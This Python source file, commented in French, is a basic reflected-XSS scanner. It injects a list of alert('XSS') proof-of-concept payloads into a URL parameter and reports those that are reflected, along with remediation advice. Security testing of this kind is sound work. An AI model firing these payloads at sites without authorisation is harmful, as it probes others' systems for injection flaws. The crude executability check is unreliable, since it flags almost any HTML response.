"""
Scanner XSS (Cross-Site Scripting) simple
"""

import requests
from colorama import Fore, Style

class ScannerXSS:
    def __init__(self, url_cible):
        self.url_cible = url_cible
        self.vulnerabilites = []
        
        # Liste de payloads XSS pour les tests
        self.payloads = [
            # Injection basique
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            
            # Pour les attributs HTML
            "\" onmouseover=\"alert('XSS')\"",
            "' onfocus='alert(\"XSS\")' autofocus ",
            
            # Événements SVG
            "<svg onload=alert('XSS')>",
            
            # Encodage URL
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            
            # Nouvelles payloads avancées :
            "<body onload=alert('XSS')>",
            "<input type=\"text\" value=\"\" onfocus=alert('XSS') autofocus>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<a href=\"javascript:alert('XSS')\">Click me</a>",
            "<details open ontoggle=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            
            # XSS avec encodage HTML
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E",
            
            # XSS avec événements rares
            "<marquee onstart=alert('XSS')>",
            "<select onfocus=alert('XSS')></select>",
            
            # Test pour les attributs style
            "\" style=\"background-image:url(javascript:alert('XSS'))\"",
        ]
    
    def tester_xss_reflechi(self, parametre="test"):
        """
        Teste les XSS réfléchis (le payload apparaît dans la réponse)
        """
        print(f"\n{Fore.YELLOW}[*] Test XSS réfléchi sur: {self.url_cible}")
        print(f"{Fore.CYAN}[-] Utilisation du paramètre: {parametre}")
        print(f"{Fore.CYAN}[-] Nombre de payloads: {len(self.payloads)}")
        
        for i, payload in enumerate(self.payloads, 1):
            # Construire l'URL avec le payload
            if "?" in self.url_cible:
                url_test = f"{self.url_cible}&{parametre}={payload}"
            else:
                url_test = f"{self.url_cible}?{parametre}={payload}"
            
            print(f"{Fore.CYAN}[-] Test {i}/{len(self.payloads)}: {payload[:30]}...")
            
            try:
                # Envoyer la requête
                reponse = requests.get(url_test, timeout=3)
                
                # Vérifier si le payload est dans la réponse
                if payload in reponse.text:
                    # Vérifier s'il est exécutable (balises non encodées)
                    if self._payload_executable(payload, reponse.text):
                        print(f"{Fore.RED}[!] VULNÉRABLE - XSS avec: {payload[:40]}...")
                        
                        self.vulnerabilites.append({
                            'type': 'XSS Réfléchi',
                            'payload': payload,
                            'url': url_test,
                            'severite': 'HAUTE',
                            'description': 'Payload réfléchi et potentiellement exécutable'
                        })
                    else:
                        print(f"{Fore.YELLOW}[~] Payload réfléchi mais encodé")
                else:
                    print(f"{Fore.GREEN}[✓] Payload non réfléchi")
                    
            except requests.Timeout:
                print(f"{Fore.YELLOW}[!] Timeout avec ce payload")
                continue
            except Exception as e:
                print(f"{Fore.RED}[✗] Erreur: {e}")
                continue
        
        return self.vulnerabilites
    
    def _payload_executable(self, payload, texte_reponse):
        """
        Vérifie si un payload XSS est potentiellement exécutable
        """
        # Vérifier si les caractères < et > sont présents (indice de balises HTML)
        if '<' in payload and '>' in payload:
            # Vérifier si ces caractères apparaissent dans la réponse
            if '<' in texte_reponse and '>' in texte_reponse:
                return True
        
        # Vérifier les attributs d'événements
        evenements = ['onerror', 'onload', 'onmouseover', 'onfocus']
        for evenement in evenements:
            if evenement in payload and evenement in texte_reponse:
                return True
        
        return False
    
    def generer_rapport(self):
        """Génère un rapport des vulnérabilités trouvées"""
        if not self.vulnerabilites:
            return f"{Fore.GREEN}[✓] Aucune vulnérabilité XSS détectée\n"
        
        rapport = f"\n{Fore.RED}{'='*60}"
        rapport += f"\n{Fore.RED}   RAPPORT XSS - {len(self.vulnerabilites)} VULNÉRABILITÉ(S)"
        rapport += f"\n{Fore.RED}{'='*60}\n"
        
        for i, vuln in enumerate(self.vulnerabilites, 1):
            rapport += f"\n{Fore.YELLOW}[VULN {i}] {vuln['type']}\n"
            rapport += f"{Fore.CYAN}  Sévérité: {vuln['severite']}\n"
            rapport += f"{Fore.CYAN}  URL: {vuln['url'][:80]}...\n"
            rapport += f"{Fore.CYAN}  Payload: {vuln['payload'][:50]}...\n"
            rapport += f"{Fore.CYAN}  Description: {vuln['description']}\n"
        
        rapport += f"\n{Fore.YELLOW}[!] Recommandations:"
        rapport += f"\n{Fore.CYAN}  1. Valider et filtrer toutes les entrées utilisateur"
        rapport += f"\n{Fore.CYAN}  2. Encoder les sorties HTML (HTML Encoding)"
        rapport += f"\n{Fore.CYAN}  3. Utiliser Content Security Policy (CSP)"
        
        return rapport

# Fonction de test
def tester_scanner_xss():
    """Teste le scanner XSS"""
    from colorama import init
    init(autoreset=True)
    
    print(f"\n{Fore.CYAN}[*] Test du scanner XSS")
    
    # URL de test (sans vulnérabilités normalement)
    url_test = "https://httpbin.org/html"
    
    scanner = ScannerXSS(url_test)
    vulnerabilites = scanner.tester_xss_reflechi()
    
    print(scanner.generer_rapport())

if __name__ == "__main__":
    tester_scanner_xss()